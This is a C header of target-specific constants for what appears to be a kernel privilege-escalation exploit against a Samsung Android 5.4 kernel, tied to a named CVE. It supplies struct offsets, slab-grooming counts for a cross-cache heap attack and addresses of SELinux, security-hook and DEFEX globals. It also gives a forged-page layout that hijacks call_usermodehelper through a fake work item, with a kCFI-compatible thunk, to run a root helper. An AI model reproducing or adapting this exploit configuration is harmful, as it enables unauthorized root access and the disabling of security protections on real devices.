#define SECCOMP_MODE_OFF            0x00
#endif
#ifndef SECCOMP_FILTER_COUNT_OFF
#define SECCOMP_FILTER_COUNT_OFF    0x04
#endif
#ifndef SECCOMP_FILTER_OFF
#define SECCOMP_FILTER_OFF          0x08
#endif
#ifndef TIF_SECCOMP_BIT
#define TIF_SECCOMP_BIT             11
#endif
#ifndef PFA_NO_NEW_PRIVS_BIT
#define PFA_NO_NEW_PRIVS_BIT        0
#endif

/* ── file_operations ──
 * Independently derived; came out identical to android14-6.1's defaults
 * (this struct's shape hasn't moved across this span) -- stated explicitly
 * rather than left to fall through the interface default, since that
 * agreement was checked, not assumed. */
#ifndef FOPS_OWNER_OFF
#define FOPS_OWNER_OFF              0x00
#endif
#ifndef FOPS_LLSEEK_OFF
#define FOPS_LLSEEK_OFF             0x08
#endif
#ifndef FOPS_READ_OFF
#define FOPS_READ_OFF               0x10
#endif
#ifndef FOPS_WRITE_OFF
#define FOPS_WRITE_OFF              0x18
#endif
#ifndef FOPS_READ_ITER_OFF
#define FOPS_READ_ITER_OFF          0x20
#endif
#ifndef FOPS_WRITE_ITER_OFF
#define FOPS_WRITE_ITER_OFF         0x28
#endif
#ifndef FOPS_IOCTL_OFF
#define FOPS_IOCTL_OFF              0x50
#endif
#ifndef FOPS_COMPAT_IOCTL_OFF
#define FOPS_COMPAT_IOCTL_OFF       0x58
#endif
#ifndef FOPS_MMAP_OFF
#define FOPS_MMAP_OFF               0x60
#endif
#ifndef FOPS_OPEN_OFF
#define FOPS_OPEN_OFF               0x70
#endif
#ifndef FOPS_RELEASE_OFF
#define FOPS_RELEASE_OFF            0x80
#endif
#ifndef FOPS_SPLICE_READ_OFF
#define FOPS_SPLICE_READ_OFF        0xc8
#endif
#ifndef FOPS_SHOW_FDINFO_OFF
#define FOPS_SHOW_FDINFO_OFF        0xe0
#endif

#ifndef MISCDEVICE_FOPS_OFF
#define MISCDEVICE_FOPS_OFF         0x10
#endif

/* ── pipe and page descriptors ──
 * PIPE_BUFFER_* (the array element) is identical to android14-6.1's
 * defaults -- unchanged across this span. PIPE_INODE_OFF_BUFS is close but
 * not identical (0x78 here vs 0xa8 there): this struct is smaller, because
 * of the row below.
 *
 * PIPE_INODE_OFF_NRBUFS/CURBUF/BUFFERS, not RING_SIZE/HEAD/TAIL: this
 * kernel predates 8cefc107ca54 (Linux 5.5, "pipe: Use head and tail
 * pointers for the ring, not cursor and length"), confirmed by reading this
 * kernel's own include/linux/pipe_fs_i.h. GhostLock's own pipe.c never
 * reads these fields on any kernel version (see the file header above) --
 * they are recorded here only because FFWheel's ffroot_w.c (a different
 * CVE, not ported to this KMI) would need them. */
#ifndef PIPE_BUFFER_OFF_PAGE
#define PIPE_BUFFER_OFF_PAGE        0x00
#endif
#ifndef PIPE_BUFFER_OFF_OFFSET
#define PIPE_BUFFER_OFF_OFFSET      0x08
#endif
#ifndef PIPE_BUFFER_OFF_LEN
#define PIPE_BUFFER_OFF_LEN         0x0c
#endif
#ifndef PIPE_BUFFER_OFF_OPS
#define PIPE_BUFFER_OFF_OPS         0x10
#endif
#ifndef PIPE_BUFFER_OFF_FLAGS
#define PIPE_BUFFER_OFF_FLAGS       0x18
#endif
#ifndef PIPE_BUFFER_OFF_PRIVATE
#define PIPE_BUFFER_OFF_PRIVATE     0x20
#endif
#ifndef PIPE_BUFFER_SIZE
#define PIPE_BUFFER_SIZE            0x28
#endif
#ifndef PIPE_BUFFER_SLOTS
#define PIPE_BUFFER_SLOTS           32
#endif
#ifndef PIPE_BUF_FLAG_CAN_MERGE
#define PIPE_BUF_FLAG_CAN_MERGE     0x10
#endif
/* 5.4 predates the CAN_MERGE flag. Ordinary anon pipe buffers have flags=0;
 * pipe.c decides whether writes merge by comparing the ops pointer instead. */
#ifndef PIPE_BUF_FLAGS_ANON
#define PIPE_BUF_FLAGS_ANON         0x00
#endif
#ifndef PIPE_INODE_OFF_NRBUFS
#define PIPE_INODE_OFF_NRBUFS       0x38
#endif
#ifndef PIPE_INODE_OFF_CURBUF
#define PIPE_INODE_OFF_CURBUF       0x3c
#endif
#ifndef PIPE_INODE_OFF_BUFFERS
#define PIPE_INODE_OFF_BUFFERS      0x40
#endif
#ifndef PIPE_INODE_OFF_BUFS
#define PIPE_INODE_OFF_BUFS         0x78
#endif

#ifndef STRUCT_PAGE_SIZE
#define STRUCT_PAGE_SIZE            0x40
#endif
#ifndef STRUCT_PAGE_FLAGS_OFF
#define STRUCT_PAGE_FLAGS_OFF       0x00
#endif
#ifndef STRUCT_PAGE_COMPOUND_HEAD_OFF
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
#endif
/* struct page's slab_cache/page_type fields (from its own anonymous union;
 * offsetof() picks the named member directly, no disambiguation needed).
 * Independently derived; came out identical to android14-6.1's defaults.
 * STRUCT_SLAB_CACHE_OFF is known to move on differently-configured
 * kernels, so it is derived per build rather than
 * copying, even though it landed on the common value here. */
#ifndef STRUCT_SLAB_CACHE_OFF
#define STRUCT_SLAB_CACHE_OFF       0x18
#endif
#ifndef STRUCT_PAGE_TYPE_OFF
#define STRUCT_PAGE_TYPE_OFF        0x30
#endif
#ifndef PG_SLAB_BIT
#define PG_SLAB_BIT                 9
#endif
#ifndef PG_HEAD_BIT
#define PG_HEAD_BIT                 16
#endif

/* ── Open file, inode and superblock ──
 * Independently derived; differs from android14-6.1's defaults
 * (FILE_OFF_F_POS 0x68 not 0x78, FILE_OFF_PRIVATE_DATA 0xc8 not 0xd8 -- this
 * struct is smaller by the same 0x10 throughout past f_count). Not measured:
 * FILE_SIZE as an allocated stride (a slab fact, not sizeof) and FILP_*.  */
#ifndef FILE_OFF_F_INODE
#define FILE_OFF_F_INODE            0x20
#endif
#ifndef FILE_OFF_F_OP
#define FILE_OFF_F_OP               0x28
#endif
#ifndef FILE_OFF_F_COUNT
#define FILE_OFF_F_COUNT            0x38
#endif
#ifndef FILE_OFF_F_POS
#define FILE_OFF_F_POS              0x68
#endif
#ifndef FILE_OFF_PRIVATE_DATA
#define FILE_OFF_PRIVATE_DATA       0xc8
#endif
#ifndef INODE_OFF_I_SB
#define INODE_OFF_I_SB              0x28
#endif
#ifndef INODE_OFF_I_INO
#define INODE_OFF_I_INO             0x40
#endif
#ifndef SUPER_BLOCK_OFF_S_DEV
#define SUPER_BLOCK_OFF_S_DEV       0x10
#endif
#ifndef MM_PGD_OFF
#define MM_PGD_OFF                  0x48
#endif
#ifndef FILES_FDT_OFF
#define FILES_FDT_OFF               0x20
#endif
#ifndef FDT_FD_OFF
#define FDT_FD_OFF                  0x08
#endif
#ifndef FILE_PRIVATE_DATA_OFF
#define FILE_PRIVATE_DATA_OFF       0xc8
#endif

/* ── Page size ── */
#ifndef PAGE_SHIFT
#define PAGE_SHIFT                  12
#endif
#ifndef PAGE_SIZE
#define PAGE_SIZE                   (1UL << PAGE_SHIFT)
#endif

/* ── Slab geometry ──
 * Runtime facts, read from /proc/slabinfo on the rooted device (a plain
 * root file read -- no kprobe needed: a kprobe_events write panics this
 * device regardless of which function is probed, including otherwise-safe
 * ones like commit_creds, so kprobes are not a usable source of any fact
 * here).
 *
 * MM_STRUCT_SZ=0x3c0 (960): `mm_struct 408 408 960 34 8` in slabinfo --
 * *not* android14-6.1's 0x400 (1024). MM_ORDER=3 confirmed by the same
 * line's pagesperslab=8 (2^3).
 *
 * KMALLOC_CGROUP_TYPE=KMALLOC_NORMAL_TYPE (0), KMALLOC_CACHE_TYPES=2: this
 * kernel's own enum kmalloc_cache_type (include/linux/slab.h) is
 * { KMALLOC_NORMAL=0, KMALLOC_RECLAIM=1, KMALLOC_DMA=2 (only if
 * CONFIG_ZONE_DMA) } -- no KMALLOC_CGROUP member exists on this kernel at
 * all (added by a later kernel than this one). slabinfo confirms: only
 * plain `kmalloc-*` and `kmalloc-rcl-*` families exist, no `kmalloc-cg-*`
 * and no `kmalloc-dma-*` (CONFIG_ZONE_DMA is not set). A
 * GFP_KERNEL_ACCOUNT allocation on this kernel has nowhere else to go but
 * the plain row, so aliasing the type is not a guess -- it is what "no
 * accounted row" documented in this file means in the case where the
 * distinction never existed in the first place, not only where a boot
 * parameter disabled it. */
#ifndef MM_STRUCT_SZ
#define MM_STRUCT_SZ                0x3c0
#endif
#ifndef MM_ORDER
#define MM_ORDER                    3
#endif
/* mm_struct SLUB per-cache tuning, read from /sys/kernel/slab/mm_struct on this
 * build: cpu_partial=13, min_partial=5, objs_per_slab=34. The cross-cache
 * placement drains 1+cpu_partial full slabs (one object each) after the victim
 * page empties, so put_cpu_partial overflows and unfreeze_partials discards the
 * emptied victim slab to the buddy allocator (crosscache.c, drain_late). */
#ifndef MM_CPU_PARTIAL
#define MM_CPU_PARTIAL              13
#endif
#ifndef MM_MIN_PARTIAL
#define MM_MIN_PARTIAL              5
#endif
/* The drain counts derived from cpu_partial, stated here so the exploit and the
 * measurement bench share one source (ghostlock/common.h defers to these). */
#ifndef MM_DRAIN_EARLY
#define MM_DRAIN_EARLY              0
#endif

/* Refill allocations fired at the freed victim block: the smallest count that
 * reaches this target's landing ceiling. Below that count the miss rate
 * varies with the allocator's state at the instant of the placement; at and
 * above it, enough refills have run that the outcome no longer depends on
 * that timing. */
#ifndef SKB_RECLAIM_SENDS
#define SKB_RECLAIM_SENDS           16
#endif
#ifndef MM_DRAIN_LATE
#define MM_DRAIN_LATE               (MM_CPU_PARTIAL + 1)
#endif
#ifndef KMALLOC_CGROUP_TYPE
#define KMALLOC_CGROUP_TYPE         0
#endif
#ifndef KMALLOC_CACHE_TYPES
#define KMALLOC_CACHE_TYPES         2
#endif
/* kmalloc-2k (2048 bytes) in slabinfo confirms index 11 still holds: 32
 * pipe_buffer entries * 0x28 bytes = 1280 -> the next power-of-two bucket,
 * 2048 = 2^11. Page size/KMALLOC_SHIFT_HIGH-derived, not accounting-scheme
 * derived, so unaffected by the two corrections above. */
#ifndef KMALLOC_PIPE_INDEX
#define KMALLOC_PIPE_INDEX          11
#endif
#ifndef KMALLOC_PIPE_OBJ_SIZE
#define KMALLOC_PIPE_OBJ_SIZE       0x800
#endif
#ifndef KMALLOC_NORMAL_TYPE
#define KMALLOC_NORMAL_TYPE         0
#endif
#ifndef KMALLOC_SHIFT_HIGH
#define KMALLOC_SHIFT_HIGH          (PAGE_SHIFT + 1)
#endif
#ifndef KMALLOC_BUCKETS
#define KMALLOC_BUCKETS             (KMALLOC_SHIFT_HIGH + 1)
#endif
#ifndef KMALLOC_CACHE_SLOTS
#define KMALLOC_CACHE_SLOTS         (KMALLOC_CACHE_TYPES * KMALLOC_BUCKETS)
#endif
#ifndef KMALLOC_CACHE_SLOT
#define KMALLOC_CACHE_SLOT(type, index) \
  (KMALLOC_CACHES + ((type) * KMALLOC_BUCKETS + (index)) * 8)
#endif
#ifndef KMALLOC_CGROUP_PIPE_SLOT
#define KMALLOC_CGROUP_PIPE_SLOT \
  KMALLOC_CACHE_SLOT(KMALLOC_CGROUP_TYPE, KMALLOC_PIPE_INDEX)
#endif

/* ── Linear map extent, in page descriptors ──
 * Pure arithmetic on constants already stated above (memory map, struct
 * page size) -- not a separately measured fact. */
#ifndef DIRECT_MAP_PAGES
#define DIRECT_MAP_PAGES            ((DIRECT_MAP_END - DIRECT_MAP_BASE) >> PAGE_SHIFT)
#endif
#ifndef VMEMMAP_END
#define VMEMMAP_END                 (VMEMMAP_START + DIRECT_MAP_PAGES * STRUCT_PAGE_SIZE)
#endif

/* ── Derived symbol addresses ── */
#ifndef ASHMEM_MISC_FOPS
#define ASHMEM_MISC_FOPS            (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
#endif
/* Only defined for a target that supplies MISC_LIST_OFF; the misc_list probe
 * in fops.c compiles only when MISC_LIST is present. */
#if !defined(MISC_LIST) && defined(MISC_LIST_OFF)
#define MISC_LIST                   (KIMAGE_TEXT_BASE + MISC_LIST_OFF)
#endif
/* Samsung DEFEX master switch; only defined for a target that supplies its
 * offset, so the umh DEFEX-disable compiles only where it is known. */
#if !defined(BOOT_STATE_UNLOCKED) && defined(BOOT_STATE_UNLOCKED_OFF)
#define BOOT_STATE_UNLOCKED         (KIMAGE_TEXT_BASE + BOOT_STATE_UNLOCKED_OFF)
#endif
#ifndef ASHMEM_FOPS
#define ASHMEM_FOPS                 (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#endif
#ifndef ASHMEM_IOCTL
#define ASHMEM_IOCTL                (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#endif
#ifndef ASHMEM_COMPAT_IOCTL
#define ASHMEM_COMPAT_IOCTL         (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
#endif
#ifndef ASHMEM_MMAP
#define ASHMEM_MMAP                 (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
#endif
#ifndef ASHMEM_OPEN
#define ASHMEM_OPEN                 (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
#endif
#ifndef ASHMEM_RELEASE
#define ASHMEM_RELEASE              (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
#endif
#ifndef ASHMEM_SHOW_FDINFO
#define ASHMEM_SHOW_FDINFO          (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
#endif
#ifndef CONFIGFS_READ_ITER
#define CONFIGFS_READ_ITER          (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
#endif
#ifndef CONFIGFS_BIN_WRITE_ITER
#define CONFIGFS_BIN_WRITE_ITER     (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
#endif
#ifndef COPY_SPLICE_READ
#define COPY_SPLICE_READ            (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
#endif
#ifndef NOOP_LLSEEK
#define NOOP_LLSEEK                 (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
#endif
#ifndef INIT_TASK
#define INIT_TASK                   (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#endif
#ifndef ROOT_TASK_GROUP
#define ROOT_TASK_GROUP             (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#endif
#ifndef SELINUX_BLOB_SIZES
#define SELINUX_BLOB_SIZES          (KIMAGE_TEXT_BASE + SELINUX_BLOB_SIZES_OFF)
#endif
#ifndef SELINUX_ENFORCING
#define SELINUX_ENFORCING           (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#endif
/* Only defined when a target header supplies SELINUX_ENFORCING_SHADOW_OFF
 * (see a52sxq-A528BXXSBGYI3.h) -- a Samsung/KDP-patched enforcing_enabled()
 * that reads a standalone shadow global instead of selinux_state.enforcing
 * is not universal across qgki-5.4 targets. */
#if defined(SELINUX_ENFORCING_SHADOW_OFF) && !defined(SELINUX_ENFORCING_SHADOW)
#define SELINUX_ENFORCING_SHADOW    (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_SHADOW_OFF)
#endif
#ifndef SECURITY_HOOK_HEADS
#define SECURITY_HOOK_HEADS         (KIMAGE_TEXT_BASE + SECURITY_HOOK_HEADS_OFF)
#endif
#ifndef SECURITY_CAPABLE_HEAD
#define SECURITY_CAPABLE_HEAD       (SECURITY_HOOK_HEADS + 0x40)
#endif
#ifndef KMALLOC_CACHES
#define KMALLOC_CACHES              (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
#endif
#ifndef ANON_PIPE_BUF_OPS
#define ANON_PIPE_BUF_OPS           (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
#endif
#ifndef SYSTEM_UNBOUND_WQ
#define SYSTEM_UNBOUND_WQ           (KIMAGE_TEXT_BASE + SYSTEM_UNBOUND_WQ_OFF)
#endif
/* CALL_USERMODEHELPER_EXEC_WORK_OFF: a SYMMAP row, resolved by
 * tools/pixel-image/derive_offsets.py against this device's own Image +
 * data/live/a52sxq-A528BXXSBGYI3/kallsyms.txt -- confirmed matching this
 * value with `--compare`. This is the function's own address, not what a
 * forged work_struct.func slot should hold; see CALL_USERMODEHELPER_
 * EXEC_WORK_CALLABLE_OFF below, the same distinction common.h's
 * ASHMEM_*_CALLABLE fallbacks make for the ashmem table. */
#ifndef CALL_USERMODEHELPER_EXEC_WORK_OFF
#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x002b5354ULL
#endif
#ifndef CALL_USERMODEHELPER_EXEC_WORK
#define CALL_USERMODEHELPER_EXEC_WORK (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_OFF)
#endif
/* CALL_USERMODEHELPER_EXEC_WORK_CALLABLE_OFF: a JTMAP row (this device
 * builds with CFI jump tables -- see a52sxq-A528BXXSBGYI3.h's own
 * ASHMEM_*_CALLABLE_OFF comment for what that means and how the rule
 * finds the thunk). kCFI validates a callback's type at the call site as
 * well as its address, so a forged work item whose func slot holds the
 * plain function address above dequeues and reaches the call correctly but
 * fails the type check there -- the same failure signature the ashmem
 * comment documents out of misc_open(). This value is
 * tools/pixel-image/derive_offsets.py's jump_table() rule applied to the
 * same Image and kallsyms, not a guess at a symbol name. */
#ifndef CALL_USERMODEHELPER_EXEC_WORK_CALLABLE_OFF
#define CALL_USERMODEHELPER_EXEC_WORK_CALLABLE_OFF 0x017557fcULL
#endif
#ifndef CALL_USERMODEHELPER_EXEC_WORK_CALLABLE
#define CALL_USERMODEHELPER_EXEC_WORK_CALLABLE (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_CALLABLE_OFF)
#endif
/* ── struct workqueue_struct / pool_workqueue / worker_pool / work_struct ──
 * STRUCTMAP rows, resolved the same way as the task_struct/cred rows above
 * (derive_offsets.py --vmlinux, this kernel having no BTF of its own).
 * Differs from install_umh.h's own #ifndef fallbacks (android14-6.1's
 * values) at every offset past a pointer-only prefix: WQ_DFL_PWQ_OFF,
 * PWQ_NR_ACTIVE_OFF, PWQ_MAX_ACTIVE_OFF, PWQ_DELAYED_WORKS_OFF,
 * POOL_WORKLIST_OFF and POOL_NR_IDLE_OFF all moved -- this kernel's
 * pool_workqueue.nr_in_flight is int[15], one color short of android14-6.1's
 * int[16], shifting everything after it back by 4 bytes. WORK_DATA_OFF/
 * WORK_ENTRY_OFF/WORK_FUNC_OFF agree with that fallback (struct work_struct
 * has not moved), stated here anyway now that they are a checked fact
 * rather than an inherited default. */
#ifndef WQ_DFL_PWQ_OFF
#define WQ_DFL_PWQ_OFF        0xa0
#endif
#ifndef PWQ_POOL_OFF
#define PWQ_POOL_OFF          0x00
#endif
#ifndef PWQ_WQ_OFF
#define PWQ_WQ_OFF            0x08
#endif
#ifndef PWQ_WORK_COLOR_OFF
#define PWQ_WORK_COLOR_OFF    0x10
#endif
#ifndef PWQ_REFCNT_OFF
#define PWQ_REFCNT_OFF        0x18
#endif
#ifndef PWQ_NR_IN_FLIGHT_OFF
#define PWQ_NR_IN_FLIGHT_OFF  0x1c
#endif
#ifndef PWQ_NR_ACTIVE_OFF
#define PWQ_NR_ACTIVE_OFF     0x58
#endif
#ifndef PWQ_MAX_ACTIVE_OFF
#define PWQ_MAX_ACTIVE_OFF    0x5c
#endif
#ifndef PWQ_DELAYED_WORKS_OFF
#define PWQ_DELAYED_WORKS_OFF 0x60
#endif
#ifndef POOL_WORKLIST_OFF
#define POOL_WORKLIST_OFF     0x20
#endif
#ifndef POOL_NR_IDLE_OFF
#define POOL_NR_IDLE_OFF      0x34
#endif
#ifndef WORK_DATA_OFF
#define WORK_DATA_OFF         0x00
#endif
#ifndef WORK_ENTRY_OFF
#define WORK_ENTRY_OFF        0x08
#endif
#ifndef WORK_FUNC_OFF
#define WORK_FUNC_OFF         0x18
#endif
#ifndef INIT_TASK_TASKS
#define INIT_TASK_TASKS             (INIT_TASK + TASK_TASKS_OFF)
#endif

/* ── Slide references ── */
#ifndef SLIDE_INIT_TASK_OFF
#define SLIDE_INIT_TASK_OFF         INIT_TASK_OFF
#endif
#ifndef SLIDE_ROOT_TASK_GROUP_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF   ROOT_TASK_GROUP_OFF
#endif
#ifndef SLIDE_NFULNL_LOGGER_IMAGE
#define SLIDE_NFULNL_LOGGER_IMAGE   (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
#endif
#ifndef SLIDE_LOGGERS_0_1_IMAGE
#define SLIDE_LOGGERS_0_1_IMAGE     (KIMAGE_TEXT_BASE + SLIDE_LOGGERS_0_1_OFF)
#endif
#ifndef SLIDE_RANDOM_BOOT_ID_DATA_IMAGE
#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE (KIMAGE_TEXT_BASE + SLIDE_RANDOM_BOOT_ID_DATA_OFF)
#endif
#ifndef SLIDE_INIT_TASK_IMAGE
#define SLIDE_INIT_TASK_IMAGE       (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)
#endif
#ifndef SLIDE_ROOT_TASK_GROUP_IMAGE
#define SLIDE_ROOT_TASK_GROUP_IMAGE (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)
#endif
#ifndef SLIDE_SYSCTL_BOOTID_IMAGE
#define SLIDE_SYSCTL_BOOTID_IMAGE   (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)
#endif

/* ── Forged-page layout ──
 * Intra-page offsets a chain writes its fabricated objects at: chosen, not
 * measured. Carried unchanged from android14-6.1's defaults -- nothing
 * about this KMI constrains them differently. */
#ifndef LOCK_OFF
#define LOCK_OFF                    0x1350
#endif
#ifndef W0_OFF
#define W0_OFF                      0x2220
#endif
#ifndef FOPS_OFF
#define FOPS_OFF                    0x1000
#endif
#ifndef SCRATCH_OFF
#define SCRATCH_OFF                 0x3000
#endif
#ifndef RIGHT_OFF
#define RIGHT_OFF                   0x4440
#endif
#ifndef LEFT_OFF
#define LEFT_OFF                    0x5550
#endif
#ifndef FAKE_TASK_OFF
#define FAKE_TASK_OFF               0x3200
#endif
#ifndef ROOT_UMH_PATH
#define ROOT_UMH_PATH               "/data/local/tmp/cve-2026-43499-root"
#endif
#ifndef ROOT_UMH_WORK_OFF
#define ROOT_UMH_WORK_OFF           0x6000
#endif
#ifndef ROOT_UMH_DATA_OFF
#define ROOT_UMH_DATA_OFF           0x6200
#endif

#endif /* TARGET_KMI_QGKI_5_4_H */
